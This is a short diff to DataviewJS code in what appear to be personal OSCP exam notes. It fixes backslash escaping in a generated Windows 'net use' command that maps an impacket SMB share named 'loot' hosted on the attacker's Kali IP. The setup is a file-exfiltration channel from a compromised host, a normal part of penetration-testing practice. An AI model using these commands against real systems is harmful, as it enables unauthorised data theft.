@@ -8,7 +8,7 @@ sudo impacket-smbserver loot . -smb2support -user test -password test
 ```dataviewjs
 const page = dv.page("Synced OSCP Notes/Top/Active Machine");const KaliIP = page?.["KALI IP"] ?? "NO KALI IP FOUND";
 
-const command = `net use \\${KaliIP}\loot /user:test test`;
+const command = `net use \\\\${KaliIP}\\loot /user:test test`;
 
 dv.paragraph("```bash\n" + command + "\n```");
 ```
